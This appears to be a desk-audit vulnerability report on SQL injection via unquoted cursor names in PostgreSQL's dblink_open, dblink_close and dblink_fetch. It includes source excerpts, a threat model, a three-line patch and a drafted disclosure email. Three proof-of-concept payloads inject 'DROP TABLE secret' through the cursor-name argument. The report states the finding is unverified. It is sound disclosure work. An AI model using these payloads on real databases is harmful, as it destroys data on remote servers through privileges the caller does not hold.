# PostgreSQL dblink: SQL injection via unquoted cursor name in dblink_open / dblink_close / dblink_fetch

**Discovered:** 2026-05-12 by kuzushi `taint-iris-next:hunt` on `contrib/dblink/`
**Target:** PostgreSQL mainline @ commit `901ed9b352b41f034e17bc540725082a488fce31` (May 8 2026)
**File:** `contrib/dblink/dblink.c`
**Severity (agent triage):** high
**Confidence:** high
**Kuzushi run:** `/tmp/targets/pg-fdw/.kuzushi/runs/run-1778543845-5c417988a3af/`

## Summary

Three SQL-callable functions in the `dblink` extension —
`dblink_open(curname text, sql text, ...)`,
`dblink_close(curname text, ...)`,
`dblink_fetch(curname text, count int, ...)` — embed the
caller-supplied `curname` argument verbatim into the SQL statement
sent to the remote server, with **no `quote_identifier` /
`quote_ident_cstr` call**. The remote server interprets the result
via `PQsendQuery` (simple-query protocol, **multi-statement OK**), so
a caller controlling `curname` can append arbitrary SQL after `;` and
execute it on the remote server with the privileges of the dblink
user mapping.

The dblink module itself USES `quote_ident_cstr` (defined at
`dblink.c:2336`) extensively for COLUMN names in
`dblink_build_sql_*` (lines 2168, 2232, 2288, 2318, 2409, 2423).
Cursor name handling is the inconsistent gap.

## The three injection sites

### Site 1: `dblink_open` (line 479)

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 421
sql     = text_to_cstring(PG_GETARG_TEXT_PP(1));      // line 422
...
appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s",     // line 479
                 curname, sql);
res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
```

PoC payload:
```sql
SELECT dblink_open(
  'myconn',
  'foo CURSOR FOR SELECT 1; DROP TABLE secret; --',   -- curname
  'SELECT 1'                                          -- sql (ignored)
);
```

Remote receives:
```sql
DECLARE foo CURSOR FOR SELECT 1; DROP TABLE secret; -- CURSOR FOR SELECT 1
```

Parses as: `DECLARE foo CURSOR FOR SELECT 1` (legal); `DROP TABLE
secret` (executes); rest is a comment.

### Site 2: `dblink_close` (line 546) — cleanest demo

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 513
...
appendStringInfo(&buf, "CLOSE %s", curname);          // line 546
res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
```

PoC payload:
```sql
SELECT dblink_close(
  'myconn',
  'cur1; DROP TABLE secret; --'
);
```

Remote receives:
```sql
CLOSE cur1; DROP TABLE secret; --
```

Two statements execute. `dblink_close` is the cleanest demo because
the entire SQL string has no other dynamic content — the cursor name
is the only substitution.

### Site 3: `dblink_fetch` (line 644)

```c
curname = text_to_cstring(PG_GETARG_TEXT_PP(0));      // line 635
howmany = PG_GETARG_INT32(1);                          // line 636
...
appendStringInfo(&buf, "FETCH %d FROM %s",             // line 644
                 howmany, curname);
```

PoC payload:
```sql
SELECT * FROM dblink_fetch(
  'myconn',
  'cur1; DROP TABLE secret; --',
  1
) AS t(a int);
```

Remote receives: `FETCH 1 FROM cur1; DROP TABLE secret; --`.

## Threat model

Exploit requires:
1. **Permission to call** `dblink_open` / `dblink_close` / `dblink_fetch`.
   Default after `CREATE EXTENSION dblink` is **PUBLIC** —
   `dblink--1.2.sql` only `REVOKE ALL ... FROM public` on
   `dblink_connect_u`, leaving `dblink_open/close/fetch` accessible
   to any role.
2. **An established dblink connection** to a remote server. Either:
   - Via `dblink_connect` (regular form, requires postgres_fdw user
     mapping — DBA-controlled), OR
   - Via a persistent connection set up by a previous privileged
     session that the attacker can name in `connname`, OR
   - Via a `SECURITY DEFINER` wrapper function that opens the
     connection on the caller's behalf.

Effects: arbitrary SQL on the **remote server**, running as the
user mapping's role (typically a privileged remote postgres user).

## Why this is non-trivial despite already-callable `dblink_exec`

The objection "the attacker already controls remote SQL via
`dblink_exec`" is incomplete. Realistic scenarios where cursor-name
injection grants ADDITIONAL attack surface:

1. **`SECURITY DEFINER` wrappers**: applications commonly wrap
   `dblink_open` in a SECURITY DEFINER function that only allows
   specific SQL bodies but passes user input as the cursor name. The
   wrapper assumes the cursor name is "safe" — the documentation at
   `<parameter>cursorname</parameter>` says only *"The name to assign
   to this cursor"*, with no warning that it must be `quote_ident()`-ed.
2. **`GRANT EXECUTE ON FUNCTION dblink_open(...) TO some_role`**:
   admins commonly grant just the cursor-related functions
   (open/close/fetch) without granting `dblink_exec`, intending to
   delegate cursor operations only. The cursor-name injection
   converts that grant into arbitrary-SQL on the remote.
3. **Privilege boundary**: the local role calling `dblink_open` does
   NOT need credentials for the remote server — the dblink user
   mapping supplies them. So the injection is a privilege boundary
   crossing, not just "execute what you could already execute."

## Pattern precedent in PostgreSQL CVE history

- **CVE-2018-1058** — `search_path` identifier injection in PG core. Same shape (untrusted identifier substituted into dynamic SQL).
- **CVE-2020-25694** — psql `\gset` identifier handling.
- **CVE-2020-25696** — same family.

The dblink module itself defines `quote_ident_cstr` at line 2336 and
uses it 5+ times for column-name substitution. The cursor-name path
is an oversight from when the module was written, before identifier-
injection was treated as a recurring class.

## Proposed patch

```diff
diff --git a/contrib/dblink/dblink.c b/contrib/dblink/dblink.c
--- a/contrib/dblink/dblink.c
+++ b/contrib/dblink/dblink.c
@@ -476,7 +476,9 @@ dblink_open(PG_FUNCTION_ARGS)
 	if (rconn->newXactForCursor)
 		(rconn->openCursorCount)++;

-	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s", curname, sql);
+	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s",
+	                 quote_ident_cstr(curname), sql);
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
 	if (!res || PQresultStatus(res) != PGRES_COMMAND_OK)
 	{
@@ -543,7 +545,7 @@ dblink_close(PG_FUNCTION_ARGS)

 	conn = rconn->conn;

-	appendStringInfo(&buf, "CLOSE %s", curname);
+	appendStringInfo(&buf, "CLOSE %s", quote_ident_cstr(curname));

 	/* close the cursor */
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
@@ -641,7 +643,8 @@ dblink_fetch(PG_FUNCTION_ARGS)
 		dblink_conn_not_avail(conname);

 	initStringInfo(&buf);
-	appendStringInfo(&buf, "FETCH %d FROM %s", howmany, curname);
+	appendStringInfo(&buf, "FETCH %d FROM %s",
+	                 howmany, quote_ident_cstr(curname));

 	/*
 	 * Try to execute the query.  Note that since libpq uses malloc, the
```

3-line patch, reuses the existing `quote_ident_cstr` helper, no
behavioral change for legitimate identifier-shaped cursor names
(they round-trip unchanged through `quote_ident`).

## Recommended responsible disclosure

**This needs hand-verification on a live postgres install before
public disclosure.** The audit is desk-only — confirm with a real PoC
that `dblink_close('cur1; DROP TABLE x; --')` actually executes the
DROP on the remote server.

Steps to verify:
1. Set up two postgres instances (local + remote) with dblink installed.
2. Create remote table: `CREATE TABLE remote.secret (id int);`
3. From local, establish dblink connection.
4. Run the PoC payload; observe `secret` dropped on remote.

If confirmed, email **security@postgresql.org**:

> Subject: SQL injection via unquoted cursor name in dblink_open / dblink_close / dblink_fetch
>
> Hi PostgreSQL security team,
>
> While running an automated taint analysis on postgres mainline
> (commit `901ed9b35`, 2026-05-08), I identified a SQL injection
> vulnerability in three SQL-callable dblink functions:
> `dblink_open`, `dblink_close`, and `dblink_fetch`. All three embed
> the caller-supplied `cursorname` text argument verbatim into the
> SQL statement sent to the remote server via `libpqsrv_exec`
> (which uses `PQsendQuery`, simple-query protocol, multi-statement
> OK), with no `quote_identifier` / `quote_ident_cstr` call.
>
> The module already defines `quote_ident_cstr` at `dblink.c:2336`
> and uses it 5+ times for column-name substitution in
> `dblink_build_sql_*`. The cursor-name path is the inconsistent gap.
>
> Cleanest demo is `dblink_close('cur1; DROP TABLE x; --')` →
> remote receives `CLOSE cur1; DROP TABLE x; --` → two statements
> execute on the remote server with the dblink user-mapping
> privileges.
>
> Threat model and patch attached. The threat model requires either
> (1) a `SECURITY DEFINER` wrapper that passes user input as
> cursorname, or (2) `GRANT EXECUTE` of just the cursor-related
> functions without `dblink_exec`, or (3) an existing dblink
> connection an attacker can name in `connname`. The privilege
> boundary crossed is local-caller → remote-server-via-user-mapping.
>
> Patch is 3 lines, reuses the existing `quote_ident_cstr` helper.
>
> Happy to coordinate disclosure timing on your usual schedule.
>
> — <your name>
>
> [verified PoC, threat model details, patch attached]

## Status

- **Persisted in kuzushi findings**: see `/tmp/targets/pg-fdw/.kuzushi/v2/findings.sqlite3`
- **PoC verification**: NOT YET DONE — desk audit only
- **Email**: NOT sent — pending PoC verification
- **Patch**: drafted above, NOT upstreamed
- **Affected versions**: Likely all supported (dblink_open/close/fetch
  signatures unchanged for decades). PG 13–17 + master at time of writing.

## Caveat

This is a desk-audit finding. The mechanic is unambiguous (regex
match + verified call-chain via Thread D + multi-statement protocol
confirmed) but **a live PoC on a real two-instance postgres setup is
necessary before claiming CVE-worthiness publicly**. There's a
non-zero chance the postgres team will respond "dblink is by-design
caller-trusted, use `quote_ident` yourself" — that would land it as a
hardening commit rather than a CVE.

If it IS a CVE: this is meme-worthy. Headline: "PostgreSQL dblink:
20+ years of identifier injection in cursor names." Affects every
contrib install with dblink + user-mapped remote servers.
